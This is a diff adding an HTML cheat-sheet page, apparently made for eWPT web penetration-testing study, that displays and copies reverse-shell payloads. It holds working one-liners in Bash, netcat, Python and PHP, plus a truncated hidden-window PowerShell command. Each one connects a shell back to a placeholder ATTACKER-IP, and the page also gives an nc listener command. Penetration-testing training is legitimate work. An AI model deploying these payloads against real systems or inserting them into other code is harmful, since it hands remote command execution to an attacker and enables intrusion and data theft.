@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reverse Shells - eWPT</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #1a0033; color: #f3e5f5; margin: 20px; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #b388ff; padding-bottom: 10px; }
+        h2 { color: #b388ff; margin: 0; }
+        table { width: 100%; border-collapse: collapse; background-color: #2d004d; margin-top: 20px; table-layout: fixed; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #4a148c; word-wrap: break-word; }
+        th { background-color: #311b92; color: #b388ff; }
+        .payload-code { font-family: 'Courier New', monospace; color: #ea80fc; background: #120024; padding: 6px; border-radius: 4px; display: block; font-size: 0.9em; }
+        button { background-color: #b388ff; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
+        input[type="text"] { width: 95%; background: #120024; border: 1px solid #4a148c; color: #fff; padding: 6px; }
+    </style>
+</head>
+<body>
+    <div class="header-container">
+        <h2>🐚 Reverse Shell Payloads</h2>
+    </div>
+    <p>Replace <b>ATTACKER-IP</b> and <b>PORT</b> before using. Use <code>nc -lvnp [PORT]</code> to listen.</p>
+    <table>
+        <thead>
+            <tr>
+                <th style="width: 150px;">Type</th>
+                <th>Payload</th>
+                <th style="width: 100px;">Action</th>
+                <th>Notes</th>
+            </tr>
+        </thead>
+        <tbody id="shellBody"></tbody>
+    </table>
+    <script>
+        const shells = [
+            { t: 'Bash', p: 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1' },
+            { t: 'Netcat', p: 'nc -e /bin/sh ATTACKER-IP PORT' },
+            { t: 'Python', p: 'python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'' },
+            { t: 'PHP', p: 'php -r \'$sock=fsockopen("ATTACKER-IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");\'' },
+            { t: 'Powershell', p: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER-IP",PORT);...' }
+        ];
+        const shellBody = document.getElementById('shellBody');
+        shells.forEach(item => {
+            const b64 = btoa(item.p);
+            shellBody.innerHTML += `<tr><td><b>${item.t}</b></td><td><span class="payload-code">${item.p}</span></td><td><button onclick="copyEncoded('${b64}')">Copy</button></td><td><input type="text"></td></tr>`;
+        });
+        function copyEncoded(b64) { navigator.clipboard.writeText(atob(b64)); event.target.innerText = 'Copied!'; setTimeout(() => { event.target.innerText = 'Copy'; }, 800); }
+    </script>
+</body>
+</html>
